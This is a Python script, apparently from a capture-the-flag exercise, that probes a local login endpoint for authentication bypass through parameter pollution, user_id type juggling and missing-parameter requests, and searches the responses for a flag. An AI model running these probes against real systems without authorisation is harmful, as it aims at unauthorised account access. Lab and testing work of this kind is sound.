import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"

print("[*] Testing parameter manipulation techniques\n")

# Test 1: Array/Multiple parameter values
print("[TEST 1] Parameter pollution - multiple user_id values")
test_cases = [
    {"username": "test", "password": "test", "user_id": ["10032", "1"]},
    {"username": "test", "password": "test", "user_id": ["10032", "10000"]},
]

for i, data in enumerate(test_cases, 1):
    print(f"\n  Case {i}: {data}")
    try:
        session = requests.Session()
        auth_resp = session.post(PASSWORD_TEST_URL, data=data, allow_redirects=True, timeout=5)
        print(f"    Status: {auth_resp.status_code}, URL: {auth_resp.url}, Length: {len(auth_resp.text)}B")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
        if flag_match:
            print(f"    [!] FLAG: {flag_match.group(0)}")
    except Exception as e:
        print(f"    Error: {e}")

print("\n" + "="*60 + "\n")

# Test 2: Type juggling - send user_id as different types
print("[TEST 2] Type juggling - user_id as different types")
type_tests = [
    ({"username": "test", "password": "test", "user_id": 1}, "Integer 1"),
    ({"username": "test", "password": "test", "user_id": 10000}, "Integer 10000"),
    ({"username": "test", "password": "test", "user_id": "0"}, "String '0'"),
    ({"username": "test", "password": "test", "user_id": ""}, "Empty string"),
    ({"username": "test", "password": "test"}, "No user_id"),
]

for data, desc in type_tests:
    print(f"\n  {desc}: {data}")
    try:
        session = requests.Session()
        auth_resp = session.post(PASSWORD_TEST_URL, data=data, allow_redirects=True, timeout=5)
        print(f"    Status: {auth_resp.status_code}, URL: {auth_resp.url}, Length: {len(auth_resp.text)}B")
        
        if len(auth_resp.text) != 1184:
            print(f"    [+] Different response size!")
            print(f"    Content snippet: {auth_resp.text[:300]}")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
        if flag_match:
            print(f"    [!] FLAG: {flag_match.group(0)}")
            print(f"\n    Full response:\n{auth_resp.text}")
    except Exception as e:
        print(f"    Error: {e}")

print("\n" + "="*60 + "\n")

# Test 3: Check what happens without password/username
print("[TEST 3] Missing required parameters")
missing_param_tests = [
    ({"password": "test", "user_id": "10032"}, "No username"),
    ({"username": "test", "user_id": "10032"}, "No password"),
    ({"username": "test", "password": "test", "user_id": "1"}, "Different user_id"),
]

for data, desc in missing_param_tests:
    print(f"\n  {desc}: {data}")
    try:
        session = requests.Session()
        auth_resp = session.post(PASSWORD_TEST_URL, data=data, allow_redirects=True, timeout=5)
        print(f"    Status: {auth_resp.status_code}, URL: {auth_resp.url}, Length: {len(auth_resp.text)}B")
        
        if "error" not in auth_resp.url and len(auth_resp.text) != 1184:
            print(f"    [+] Unexpected success or different response!")
            print(f"    Content snippet: {auth_resp.text[:400]}")
            
            flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
            if flag_match:
                print(f"    [!] FLAG: {flag_match.group(0)}")
    except Exception as e:
        print(f"    Error: {e}")

print("\n[*] Parameter manipulation testing complete")

